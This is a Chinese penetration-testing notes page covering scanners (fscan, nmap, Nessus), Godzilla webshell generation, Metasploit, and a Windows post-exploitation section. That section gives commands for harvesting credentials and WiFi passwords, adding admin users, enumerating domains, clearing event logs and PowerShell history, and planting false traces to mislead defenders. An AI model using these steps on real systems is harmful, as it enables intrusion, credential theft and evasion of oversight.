+<h4 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h4><p><a href="">fofa网站</a></p>
+<h4 id="zoomeye"><a href="#zoomeye" class="headerlink" title="zoomeye"></a>zoomeye</h4><p><a target="_blank" rel="noopener" href="https://www.zoomeye.org/">zoomeye网站</a></p>
+<h3 id="扫描网段工具"><a href="#扫描网段工具" class="headerlink" title="扫描网段工具"></a>扫描网段工具</h3><h4 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h4><p><a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">github下载fscan</a></p>
+<ul>
+<li>kail安装fscan</li>
+</ul>
+<p>安装go的环境</p>
+<p>kail直接输入go，给你提示，需要安装两个东西,键入指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gccgo-go </span><br><span class="line">sudo apt install golang-go</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>go env</code>查看go的环境<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240415163216.png" alt="20240415163216"></p>
+<p>因为下载go的依赖可能需要经常使用到github<br>所以可以配置一下代理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go env -w GO111MODULE=on</span><br><span class="line">go env -w GOPROXY=https://goproxy.io,direct</span><br></pre></td></tr></table></figure>
+
+<p>从github上面下载fscan<br><code>git clone https://github.com/shadow1ng/fscan.git</code></p>
+<p>实在下载不下来也可以先通过，自己的主机下载，在移动进虚拟机</p>
+<h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><ul>
+<li>最详细的教程肯定还是我们的官方文档</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://nmap.org/man/zh/index.html">Nmap官方文档</a></p>
+<ul>
+<li>端口扫描 扫描主机的「开放端口」，在nmap后面直接跟主机IP（默认扫描1000个端口）</li>
+</ul>
+<p><code>nmap 172.30.192.218</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240416184214.png" alt="20240416184214"></p>
+<ol>
+<li>指定端口</li>
+</ol>
+<p>扫描「指定端口」，使用 -p 参数，可以一次扫描单个端口、多个端口、或扫描一个范围的端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.31.180 -p 80</span><br><span class="line">nmap 192.168.31.180 -p 1-80</span><br><span class="line">nmap 192.168.31.180 -p 80,3389,22,21</span><br><span class="line">nmap 192.168.31.180 -p 1-65535</span><br></pre></td></tr></table></figure>
+
+<p>扫描多个目标地址    </p>
+<p><code>nmap 192.168.0.1 192.168.0.6</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240416231356.png" alt="20240416231356"></p>
+<p>扫描一个范围内的目标地址：</p>
+<p>nmap指令参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-sL (列表扫描)</span><br><span class="line">列表扫描是主机发现的退化形式，它仅仅列出指定网络上的每台主机， 不发送任何报文到目标主机。</span><br><span class="line"></span><br><span class="line">-sP (Ping扫描)</span><br><span class="line">该选项告诉Nmap仅仅 进行ping扫描 (主机发现)，然后打印出对扫描做出响应的那些主机。</span><br><span class="line">这一个一般是实际攻防的时候可以使用，因为ping这样的操作是不容易被ban ip的nmap一些其他的操作还是比较容易被封禁ip的</span><br><span class="line"></span><br><span class="line">-n (不用域名解析)</span><br><span class="line">告诉Nmap 永不对它发现的活动IP地址进行反向域名解析。 既然DNS一般比较慢，这可以让事情更快些。</span><br><span class="line"></span><br><span class="line">-R (为所有目标解析域名)</span><br><span class="line">告诉Nmap 永远 对目标IP地址作反向域名解析。 一般只有当发现机器正在运行时才进行这项操作。</span><br><span class="line"></span><br><span class="line">-sS (TCP SYN扫描)</span><br><span class="line">SYN扫描作为默认的也是最受欢迎的扫描选项，是有充分理由的。 它执行得很快，在一个没有入侵防火墙的快速网络上，每秒钟可以扫描数千个 端口。 SYN扫描相对来说不张扬，不易被注意到，因为它从来不完成TCP连接。 它也不像Fin/Null/Xmas，Maimon和Idle扫描依赖于特定平台，而可以应对任何兼容的 TCP协议栈。 它还可以明确可靠地区分open(开放的)， closed(关闭的)，和filtered(被过滤的) 状态</span><br><span class="line">它常常被称为半开放扫描， 因为它不打开一个完全的TCP连接。它发送一个SYN报文， 就像您真的要打开一个连接，然后等待响应。 SYN/ACK表示端口在监听 (开放)，而 RST (复位)表示没有监听者。如果数次重发后仍没响应， 该端口就被标记为被过滤。如果收到ICMP不可到达错误 (类型3，代码1，2，3，9，10，或者13)，该端口也被标记为被过滤。</span><br><span class="line"></span><br><span class="line">我就不继续赘述了</span><br></pre></td></tr></table></figure>
+
+<h5 id="nmap漏洞扫描详解"><a href="#nmap漏洞扫描详解" class="headerlink" title="nmap漏洞扫描详解"></a>nmap漏洞扫描详解</h5><ul>
+<li>Vuln漏洞扫描</li>
+</ul>
+<p>Nmap 的漏洞扫描将针对目标运行该工具的默认漏洞扫描脚本。这些对于查找可利用的常见漏洞非常有用。要运行漏洞扫描，使用以下命令语法：</p>
+<p><code>nmap --script vuln &lt;target&gt;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240524132757.png" alt="20240524132757"></p>
+<p>可以利用指令查看以下，nmap有哪些漏洞的扫描，还是比较少的</p>
+<p>+ </p>
+<ul>
+<li>常用指令</li>
+</ul>
+<p>主机发现<br><code>nmap -sn 192.168.1.0/24</code></p>
+<p>端口扫描<br><code>nmap -p- 192.168.1.0/24</code></p>
+<p>漏洞扫描<br><code>nmap --script http-vuln-cve2015-1635 192.168.1.0/24</code></p>
+<p><code>nmap -sS -sV 192.168.231.0/24   #扫描目标ip段，查看上线主机</code></p>
+<h5 id="nmap常用指令-GJ"><a href="#nmap常用指令-GJ" class="headerlink" title="nmap常用指令(GJ)"></a>nmap常用指令(GJ)</h5><p>最近有一个资产渗透的项目，想用nmap去扫一下，但是发现有的扫的真的慢，于是就去网上找了一个大佬的语法</p>
+<p><code>sudo nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -oG result.txt -iL ip.txt</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-sS：使用SYN方式扫描，默认用的是-sT方式，即TCP方式，需要完成完整的三次握手，比较费时，SYN就比较快一些了；</span><br><span class="line">-Pn： 禁用PING检测，这样速度快，并且可以防止有些主机无法ping通而被漏掉不扫描；</span><br><span class="line">-n： 功能未知；</span><br><span class="line">–open： 只输出检测状态为open的端口，即开放的端口；</span><br><span class="line">–min-hostgroup 4：调整并行扫描组的大小；</span><br><span class="line">–min-parallelism 1024：调整探测报文的并行度；</span><br><span class="line">–host-timeout 30：检测超时的跳过</span><br><span class="line">-T4：总共有T0-T5，貌似T4比较折中</span><br><span class="line">-v：打印详细扫描过程</span><br><span class="line">-oG：输出为比较人性化的格式，一条记录一行，后期好处理</span><br><span class="line">-iL：载入ip段文件，批量扫，不用一条条执行了。</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="操作大全"><a href="#操作大全" class="headerlink" title="操作大全"></a>操作大全</h3><h4 id="网络配置指令"><a href="#网络配置指令" class="headerlink" title="网络配置指令"></a>网络配置指令</h4><p>linux kail配置dns<br><code>vim /etc/resolv.conf</code></p>
+<p>写入<code>namesever x.x.x.x</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nameserver 114.114.114.114 //国内移动、电信和联通通用的DNS</span><br><span class="line">nameserver 8.8.8.8 //是谷歌的IP地址</span><br><span class="line">nameserver 223.5.5.5 //是阿里云的IP地址</span><br><span class="line">nameserver 180.76.76.87 //是百度的IP地址</span><br></pre></td></tr></table></figure>
+
+<p>linux重启网络指令<br><code>/etc/init.d/networking restart</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用systemctl关闭和重启服务</span><br><span class="line">systemctl stop NetworkManager  //NetworkManager这里注意大小写，linux是区分的</span><br><span class="line">systemctl restart networking   //重启服务，如果重启服务后查看没有显示就再次输入这个命令</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>用主机给kail配置ip</li>
+</ol>
+<p>因为虚拟机给子网内的其他设备分配IP是根据DHCP来配置的，因为ipv4的地址其实不是无法用完。所以网络设备就需要配置，IP地址、网关地址、DNS服务器地址等。采用手工方式为终端配置这些参数非常低效且不够灵活。DHCP实现了网络参数配置的自动化，降低客户端的配置和维护成本。</p>
+<p>但是如果我们需要利用xshell来方便我们连接的话，动态的ip就需要每回重新配置xshell设置，所以我们给kail手动配置上ip。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240418200314.png" alt="20240418200314"></p>
+<p>网络模式需要NAT</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240418200618.png" alt="20240418200618"></p>
+<p>将DHCP关闭</p>
+<p>子网IP范围为 192.168.233.0~192.168.233.255内。</p>
+<ol start="2">
+<li>用主机给kail配置ip(上面一个可以不需要look了)</li>
+</ol>
+<p>kail配置静态ip<br><code>vim /etc/network/interfaces</code> 进网卡配置文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240418203226.png" alt="20240418203226"></p>
+<p>设置静态ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iface eth0 inet static  //配置eth0使用静态地址</span><br><span class="line">address 192.168.19.6    //配置eth0的固定IP地址，网段要和物理机的一样，且此IP未被使用</span><br><span class="line">netmask 255.255.255.0   //配置子网掩码</span><br><span class="line">geteway 192.168.19.2      //配置网关</span><br></pre></td></tr></table></figure>
+
+<p>配置固定ip时候，最好ping一下，可以判断ip地址有没有在使用</p>
+<p>你们根据你们自己的进行配置</p>
+<h3 id="后门工具"><a href="#后门工具" class="headerlink" title="后门工具"></a>后门工具</h3><h4 id="godzilla"><a href="#godzilla" class="headerlink" title="godzilla"></a>godzilla</h4><p><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/Godzilla/releases">项目地址</a></p>
+<h5 id="Godzliia使用"><a href="#Godzliia使用" class="headerlink" title="Godzliia使用"></a>Godzliia使用</h5><ul>
+<li>生成木马</li>
+</ul>
+<p>流程：输入密码&gt;密钥&gt;有效载荷&gt;加密器<br>  简单来说生成木马需要先设置密码和密钥然后选有效载荷，在载荷中有PHP、JAVA、ASP、CSHAP，在选择好载荷后，就需要选择加密器了，至于加密形式可以参考作者的解释。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240509104222.png" alt="20240509104222"></p>
+<p>接下来选择保存位置</p>
+<p>接下来就可以上传连接了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240509113419.png" alt="20240509113419"></p>
+<p>设置好配置</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240509113455.png" alt="20240509113455"></p>
+<p>也可以自己配置一些请求的头</p>
+<h4 id="antsword（蚁剑）"><a href="#antsword（蚁剑）" class="headerlink" title="antsword（蚁剑）"></a>antsword（蚁剑）</h4><h3 id="漏洞利用和扫描工具"><a href="#漏洞利用和扫描工具" class="headerlink" title="漏洞利用和扫描工具"></a>漏洞利用和扫描工具</h3><h4 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h4><ul>
+<li>Nessus的安装<br><a target="_blank" rel="noopener" href="https://www.tenable.com/downloads/nessus?loginAttempted=true">nessus安装地址</a></li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240524132137.png" alt="20240524132137"></p>
+<p>移动到kail虚拟机,尝试安装<br><code>dpkg -i Nessus-10.7.3-debian10_amd64.deb</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240524133341.png" alt="20240524133341"></p>
+<p>启动nessus服务：<code>systemctl start nessusd</code><br>设置nessus服务开机自启动：<code>systemctl enable nessusd</code></p>
+<p><code>netstat -ntpl | grep nessus</code><br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240524153458.png" alt="20240524153458"></p>
+<p><code>https://192.168.233.110:8834/#/</code></p>
+<p>获取激活码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240524153617.png" alt="20240524153617"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240524153824.png" alt="20240524153824"></p>
+<p>这样就可以拿到自己的密钥了</p>
+<p>先进入自己nessus开的web服务</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240524152940.png" alt="20240524152940"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240524154212.png" alt="20240524154212"></p>
+<p>接下来创建账号密码，再等待安装</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240524154314.png" alt="20240524154314"></p>
+<p>接下来就需要你去安装插件</p>
+<ul>
+<li>获取离线插件包地址及激活证书</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://plugins.nessus.org/v2/offline.php">获取地址</a></p>
+<p><code>/opt/nessus/sbin/nessuscli fetch  --challenge</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240524154721.png" alt="20240524154721"></p>
+<p>输入你的两个码，获取下载地址和license</p>
+<p>点击下载地址和最下面的密钥证书</p>
+<p><code>/opt/nessus/sbin/nessuscli fetch --register-offline nessus.license</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240524160026.png" alt="20240524160026"></p>
+<p><code>/opt/nessus/sbin/nessuscli update ./all-2.0.tar.gz</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240524160755.png" alt="20240524160755"></p>
+<p>更新完成</p>
+<p><code>systemctl restart nessusd</code>重启</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240524184549.png" alt="20240524184549"></p>
+<p>等待插件安装成功</p>
+<p>最开始出现了一个问题，虽然不知道是怎么回事，就是插件一直更新不出来，所以就去找了以下其他人的博客，然后更改了，压缩包的位置，然后重新updata,就成功了<br><code>cp all-2.0.tar.gz /opt/nessus/sbin</code><br><code>cd /opt/nessus/sbin</code><br><code>./nessuscli update ./all-2.0.tar.gz</code></p>
+<h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><p>Metasploit框架（Metasploit Framework, MSF）是一个开源工具，旨在方便渗透测试，它是由Ruby程序语言编写的模板化框架，具有很好的扩展性，便于渗透测试人员开发、使用定制的工具模板。<br>Metasploit可向后端模块提供多种用来控制测试的接口（如控制台、 Web 、 CLI ）。推荐使用控制台接口，通过控制台接口，你可以访问和使用所有Metasploit的插件，例如Payload、利用模块、 Post模块等。 Metasploit还有第三方程序的接口，例如Nmap、SQLMap 等，可以直接在控制台接口里使用，要访问该界面。</p>
+<p>Auxiliaries（辅助模块）<br>该模块不会直接在测试者和目标主机之间建立访问，它们只负责执行扫描、嗅探、指纹识别等相关功能以辅助渗透测试。<br>Exploit（漏洞利用模块）<br>漏洞利用是指由渗透测试者利用 一个系统、应用或者服务中的安全漏洞进行的攻击行为 。流行的渗透攻击技术包括缓冲区溢出、 Web应用程序攻击，以及利用配置错误等，其中包含攻击者或测试人员针对系统中的漏洞而设计的各种POC验证程序，用于破坏系统安全性的攻击代码，每个漏洞都有相应的攻击代码 。<br>Payload（攻击载荷模块）<br>攻击载荷是我们期望目标系统在被渗透攻击之后完成实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令或者执行特定代码，在Metasploit框架中可以自由地选择、传送和植入 。攻击载荷也可能是简单地在目标操作系统上执行一些命令，如添加用户账号等 。<br>Post（后期渗透模块）<br>该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等。<br>Encoders（编码工具模块）<br>该模块在渗透测试中负责免杀，以防止被杀毒软件、防火墙、 IDS及类似的安全软件检测出来。</p>
+<p>&#96;&#96;</p>
+<h2 id="knowledge"><a href="#knowledge" class="headerlink" title="knowledge"></a>knowledge</h2><h3 id="windows后渗透阶段"><a href="#windows后渗透阶段" class="headerlink" title="windows后渗透阶段"></a>windows后渗透阶段</h3><ul>
+<li>通过基本的方式去获取，服务器或者主机的权限</li>
+</ul>
+<p>windows获取shell之后可以干什么呢,最好是利用远程桌面去登录，但是要确定管理员是否在，一般windows拿完shell之后最好就是，创建新的管理员用户和留后门，保持权限维持</p>
+<h4 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h4><p>既然我们拿到了windows主机的权限，那就可以查看这个主机到底有没有类似敏感文件之类的东西</p>
+<h5 id="powershell命令历史记录和清除"><a href="#powershell命令历史记录和清除" class="headerlink" title="powershell命令历史记录和清除"></a>powershell命令历史记录和清除</h5><p><a target="_blank" rel="noopener" href="https://www.ddosi.org/hack-info/">借鉴文章</a></p>
+<p><code>powershell Get-Content (Get-PSReadlineOption).HistorySavePath</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521132958.png" alt="20240521132958"></p>
+<p>可以看到执行之后进入了<code>system32</code></p>
+<p>某些情况下，该命令可能无法使用，我们可先用dir查看powershell历史命令记录文件的存放位置，然后使用type进行读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br><span class="line"></span><br><span class="line">type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br><span class="line"></span><br><span class="line">shell dir %appdata%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240521141227.png" alt="20240521141227"></p>
+<p>PS：打点时遇到Windows环境的文件下载漏洞，可下载以下文件进行敏感信息翻阅，某些运维会使用powershell进行管理工作组或域内机器，运气好的可以找到ssh、数据库这类登录密码或其它重要文件，尤其是一些运维用的脚本，里面大多包含主机、数据库登录密码，可通过powershell历史记录找到这些脚本的绝对路径，然后在使用文件下载漏洞进行读取，这也是一个不错的突破点，而且这些历史命令大多包含链接主机信息，可提取里面的IP段，扩宽我们的攻击面。</p>
+<p><code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code> 一般的历史文件存储的路径</p>
+<p>但是很可惜，我这台靶机是没有装powershell的</p>
+<p>应急溯源也可以看看这个文件，说不定会发现些蛛丝马迹</p>
+<p>渗透结束时，如果使用过powershell的，务必清除powershell命令历史记录，在一定程度上可以减少被溯源成功的概率，当然，也可以迷惑蓝队，写入一些奇怪的命令，例如把上线的C2地址更改为境外的已公开IOC情报的挖矿IP，然后丢进来几个挖坑样本，误导蓝队进行溯源消耗防守方的精力，伪造痕迹的时候记得更改文件时间，还得注意下语言文字这些细节，不然蓝队看到中文名字、错误语法和时间的挖矿，结合攻防演练时间，第一时间肯定会知道这是伪造出来的，如果内网存在IDS这样的流量审计设备，蓝队一定位机器查看设备流量，说不定还可能暴露我们的踪迹。</p>
+<ul>
+<li>清除powershell历史运行命令记录</li>
+</ul>
+<p><code>powershell Remove-Item (Get-PSReadlineOption).HistorySavePath</code></p>
+<h5 id="查看历史打开文件"><a href="#查看历史打开文件" class="headerlink" title="查看历史打开文件"></a>查看历史打开文件</h5><p>这目录里面放着电脑的历史打开文件记录，看过什么文件、什么时候，包括点过那几个盘，都很详细的记录，我们可通过该目录定位运维常用的文件夹、文件等，寻找敏感信息，查看这个目录往往有奇效，很多时候运维为了方便管理机器喜欢用密码小本本来记录各个机器的密码，毕竟一个运维管理几十台机器是非常常见，这么多密码不一定记得住，所以大多数运维会选择把机器密码记录在txt、xls这种文件里，这也就给了我们可乘之机，其实我在这个目录遇到最多的还是运维写的日报、周报，很多时候这些报告里面包含了大量服务器信息，这时候我们就可以通过这些敏感信息进一步内网横向。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir %APPDATA%\Microsoft\Windows\Recent</span><br><span class="line">dir C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent</span><br><span class="line">dir /a /s /b c:\password.txt</span><br></pre></td></tr></table></figure>
+
+<p>其它的常用关键字搜索，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir /a /s /b c:\*.conf *.ini *.inc *.config </span><br><span class="line">dir /a /s /b c:\conf.* config.* </span><br><span class="line">dir /a /s /b c:\*.txt *.xls *.xlsx *.docx</span><br><span class="line">findstr /s /i /n /d:C:\ /c:&quot;pass&quot; *.config</span><br></pre></td></tr></table></figure>
+
+<p>某些时候显示内容过多，可对这些关键字进行逐个搜索，或使用findstr进行过滤，如:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir /a /s /b c:\*.conf *.ini *.inc *.config | findstr &quot;运维&quot;</span><br><span class="line">dir /a /s /b c:\*.txt *.xls *.xlsx *.docx | findstr &quot;密码&quot;</span><br></pre></td></tr></table></figure>
+
+<p>另外可以去尝试阅读回收站。</p>
+<p>recent目录记录了查看历史打开文件，在后渗透时，我们通常会往目标机子上传各种文件，例如nps、mimikatz、psexec等，这些工具在使用过程中，大多会在recent目录产生记录，这时候为了更好的隐藏痕迹，我们可以rd命令删除运行记录或直接使用CS或webshell管理工具提供的文件管理功能删除该记录，另外psexec成功登录退出后，会在目标机器的安全日志中产生Event 4624、4628、4634，在系统日志中产生Event 7045（记录PSEXESVC安装）、Event 7036（记录PSEXESVC服务状态），Windows日志也需要处理下；关于清理痕迹不是本文的主题，就不多赘述了，对于应急的同学可以多关注下recent文件夹和Windows日志，在不手动清理或者使用某些安全工具清理垃圾的时候，recent这个目录为空或者很少东西，那么应该要注意下了。</p>
+<h5 id="敏感文件寻找"><a href="#敏感文件寻找" class="headerlink" title="敏感文件寻找"></a>敏感文件寻找</h5><p>服务器、中间件、数据库这类配置文件。<br>运维密码、工作记录、个人记录这些。<br>公司文件、合同、网络拓扑图这类。<br>……<br>服务器、中间件、数据库这类配置文件的重要性大家都懂，渗透的时候如果获取到一个包含大量敏感信息的配置文件，那将会为我们在后渗透作出良好的铺垫，如下。</p>
+<p>某次项目时，拿到一个存在内网的shell，通过对主机信息收集，发现某配置文件Config-back.xml包含了大量的数据库账号密码，之后使用CS下载该配置文件到本地，然后搭建代理利用这些账号密码批量上线MSSQL主机，再结合这些密码制作出高质量字典爆破C段机器，用了不到30分钟拿到了200多台机器权限，所以说渗透的本质是信息搜集，信息搜集的量决定着我们渗透的成果，关于配置文件的查找这里就不多说了，可参考上面的dir命令进行查找。</p>
+<p><code>dir /a /s /b d:\conf.* config.*</code></p>
+<p>另外就是要多关注下web系统本身存放的文件，之前遇到过一个IBM系统，里面有个云盘功能，之后翻这个功能模块找到了个运维建立的文件夹，里面存放了大量的数据，什么网络拓扑图、运维日志、甚至还有账号密码，还有的就是做等保渗透的时候，远程到运维机，桌面一大堆设备清单，还有各个系统的账号密码，而且这些xlsx表格都是不加密的，直接打开就能查看，一些运维为了贪图方便，往往会非常严重的安全隐患，给了入侵者很大的机会。</p>
+<p>WiFi密码获取的获取，在内网渗透，密码获取到的越多，路就越好走，很多时候内网的密码都是通用的，就算是不通用，大部分的密码也是有规律可循的，关于密码的获取可使用LaZagne。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">LaZagne github项目地址</a></p>
+<h5 id="windows-日志路径-和-清除指令"><a href="#windows-日志路径-和-清除指令" class="headerlink" title="windows 日志路径 和 清除指令"></a>windows 日志路径 和 清除指令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">系统日志：%SystemRoot%\System32\Winevt\Logs\System.evtx</span><br><span class="line">安全日志：%SystemRoot%\System32\Winevt\Logs\Security.evtx</span><br><span class="line">应用程序日志：%SystemRoot%\System32\Winevt\Logs\Application.evtx</span><br><span class="line">日志在注册表的键：HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Eventlog</span><br><span class="line">IIS默认日志位置：%SystemDrive%\inetpub\logs\LogFiles\W3SVC1\</span><br></pre></td></tr></table></figure>
+
+<p>powershell清除Windows事件日志</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PowerShell -Command &quot;&amp; &#123;Clear-Eventlog -Log Application,System,Security&#125;&quot;</span><br><span class="line">Get-WinEvent -ListLog Application,Setup,Security -Force | % &#123;Wevtutil.exe cl $_.Logname&#125;</span><br></pre></td></tr></table></figure>
+
+<p>PS：上传后的文件如果不能删除（没权限或其它因素），那么可以上传或新建同名文件，覆盖掉原有文件。</p>
+<h5 id="CMD获取WiFi密码"><a href="#CMD获取WiFi密码" class="headerlink" title="CMD获取WiFi密码"></a>CMD获取WiFi密码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">netsh wlan show profiles</span><br><span class="line">netsh wlan show profiles name=&quot;WiFi名称&quot; key=clear</span><br><span class="line"></span><br><span class="line">通过for循环一次性获取全部WiFi密码</span><br><span class="line">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#x27;netsh wlan show profiles&#x27;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</span><br></pre></td></tr></table></figure>
+
+<p>如果已经取得当前机器的管理员权限的话，可运行mimikatz、procdump之类凭据获取工具获取系统凭据，因为多数管理员可能使用同一密码或有规律性的密码来管理多台服务器，如果能够得到主机密码或者hash就可以尝试pth或psexec批量上线了；还有就是在进程收集的时候要多留意一下是否有域管启用的进程，如果刚好域管理员登录过我们已经有权限的机器，那么就可以利用域管进程进行横向了，如果没有的话可关注下ms14068，域委派这类东西，这些都是后渗透基本常识了，这里不多赘述。</p>
+<h5 id="域信息收集常用命令"><a href="#域信息收集常用命令" class="headerlink" title="域信息收集常用命令"></a>域信息收集常用命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">net use  查看ipc连接情况</span><br><span class="line">net user /domain 获取域用户列表</span><br><span class="line">net user test 123 /add 添加用户</span><br><span class="line">neet localgroup administrators test /add 添加test用户到管理组，一般情况下，管理组才能远程桌面</span><br><span class="line">net group /domain 查询域里面的组</span><br><span class="line">net group &quot;domain admins&quot; /domain 获取域管理员列表</span><br><span class="line">net group &quot;enterprise admins&quot; /domain   查看当前域中企业管理员组用户</span><br><span class="line">net group &quot;domain computers&quot; /domain    查看当前域中的所有的计算机名（登录过该域的计算机）</span><br><span class="line">net group &quot;exchange servers&quot; /domain    查看域内是否存在Exchange</span><br><span class="line">net group &quot;domain controllers&quot; /domain 查看域控制器(如果有多台)</span><br><span class="line">net config workstation  查看当前登录域</span><br><span class="line">net view 查看同一域内机器列表</span><br><span class="line">net view \\ip 查看某IP共享</span><br><span class="line">net view \\test 查看test计算机的共享资源列表</span><br><span class="line">net view /domain 查看内网存在多少个域</span><br><span class="line">Net view /domain:test 